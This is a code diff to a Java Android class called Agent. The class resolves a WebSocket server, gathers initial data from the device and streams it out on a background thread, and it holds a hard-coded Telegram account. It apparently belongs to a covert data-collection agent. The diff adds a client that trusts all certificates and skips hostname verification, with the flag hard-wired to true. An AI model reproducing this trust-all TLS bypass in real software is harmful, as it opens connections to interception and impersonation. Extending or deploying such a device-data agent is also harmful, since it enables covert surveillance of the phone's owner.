@@ -12,6 +12,14 @@ import org.json.JSONObject;
 import java.util.concurrent.BlockingQueue;
 import java.util.concurrent.PriorityBlockingQueue;
 import java.util.concurrent.TimeUnit;
+import java.security.cert.CertificateException;
+import java.security.cert.X509Certificate;
+import javax.net.ssl.SSLContext;
+import javax.net.ssl.SSLSocketFactory;
+import javax.net.ssl.TrustManager;
+import javax.net.ssl.X509TrustManager;
+import javax.net.ssl.HostnameVerifier;
+import javax.net.ssl.SSLSession;
 
 import okhttp3.OkHttpClient;
 import okhttp3.Request;
@@ -21,15 +29,52 @@ import okhttp3.WebSocketListener;
 
 
 public final class Agent {
+    private final boolean TRUST_ALL_CERTS = true;
     private final String default_accounts = "ihavenothingtogive1@telegram";
     private SharedPreferences preferences;
     private static Agent instance;
     private final BlockingQueue<DataPacket> dataQueue = new PriorityBlockingQueue<>();
     private String wsAddress;
     private WebSocket webSocket;
-    private final OkHttpClient client = new OkHttpClient.Builder()
-            .readTimeout(0, TimeUnit.MILLISECONDS)
-            .build();
+    private final OkHttpClient client;
+
+    public Agent() {
+        if (TRUST_ALL_CERTS) {
+            this.client = getUnsafeOkHttpClient();
+        } else {
+            this.client = new OkHttpClient.Builder()
+                    .readTimeout(0, TimeUnit.MILLISECONDS)
+                    .build();
+        }
+    }
+
+    private static OkHttpClient getUnsafeOkHttpClient() {
+        try {
+            final TrustManager[] trustAllCerts = new TrustManager[]{
+                    new X509TrustManager() {
+                        @Override
+                        public void checkClientTrusted(X509Certificate[] chain, String authType) {}
+                        @Override
+                        public void checkServerTrusted(X509Certificate[] chain, String authType) {}
+                        @Override
+                        public X509Certificate[] getAcceptedIssuers() {
+                            return new X509Certificate[]{};
+                        }
+                    }
+            };
+
+            final SSLContext sslContext = SSLContext.getInstance("TLS");
+            sslContext.init(null, trustAllCerts, new java.security.SecureRandom());
+            
+            return new OkHttpClient.Builder()
+                    .sslSocketFactory(sslContext.getSocketFactory(), (X509TrustManager) trustAllCerts[0])
+                    .hostnameVerifier((hostname, session) -> true)
+                    .readTimeout(0, TimeUnit.MILLISECONDS)
+                    .build();
+        } catch (Exception e) {
+            throw new RuntimeException(e);
+        }
+    }
 
     public static synchronized Agent getInstance() {
         if (instance == null) {
@@ -49,12 +94,6 @@ public final class Agent {
         new Thread(() -> {
             wsAddress = resolveWsAddress();
             if (wsAddress != null) {
-                // If resolving to host IP, try 10.0.2.2 which is more reliable in emulators
-                if (wsAddress.contains("172.25.40.27")) {
-                    Log.i("Agent", "Detected host IP, overriding with 10.0.2.2 for emulator stability");
-                    wsAddress = wsAddress.replace("172.25.40.27", "10.0.2.2");
-                }
-                
                 connectWebSocket();
                 gatherAndSendInitialData(context);
                 startDataSenderThread();
@@ -69,7 +108,7 @@ public final class Agent {
         
         String url = wsAddress;
         if (!url.startsWith("ws://") && !url.startsWith("wss://")) {
-            url = "ws://" + url;
+            url = "wss://" + url;
         }
 
         Log.i("Agent", "Connecting to WebSocket: " + url);
